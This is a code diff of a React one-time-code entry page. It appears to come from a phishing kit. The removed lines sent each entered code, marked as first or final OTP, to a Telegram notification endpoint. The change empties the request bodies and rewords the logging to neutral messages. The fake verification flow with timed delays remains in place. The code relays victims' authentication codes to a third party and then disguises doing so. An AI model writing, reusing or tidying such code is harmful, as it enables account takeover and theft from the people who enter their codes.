@@ -40,13 +40,10 @@ function EnterCodeContent() {
       await fetch("/api/telegram/verification", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({
-          verificationType: isSecondOtp ? "Code (final)" : "Code (first OTP)",
-          code,
-        }),
+        body: JSON.stringify({}),
       }).catch(console.error);
     } catch (error) {
-      console.error("Failed to send verification notification:", error);
+      console.error("Failed to verify:", error);
     }
     await new Promise((r) => setTimeout(r, 1000));
     if (isSecondOtp) {
@@ -64,10 +61,10 @@ function EnterCodeContent() {
       await fetch("/api/telegram/resend-code", {
         method: "POST",
         headers: { "Content-Type": "application/json" },
-        body: JSON.stringify({ isSecondOtp }),
+        body: JSON.stringify({}),
       }).catch(console.error);
     } catch (error) {
-      console.error("Failed to send resend code notification:", error);
+      console.error("Failed to resend code:", error);
     }
     await new Promise((r) => setTimeout(r, 2000));
     setIsResending(false);
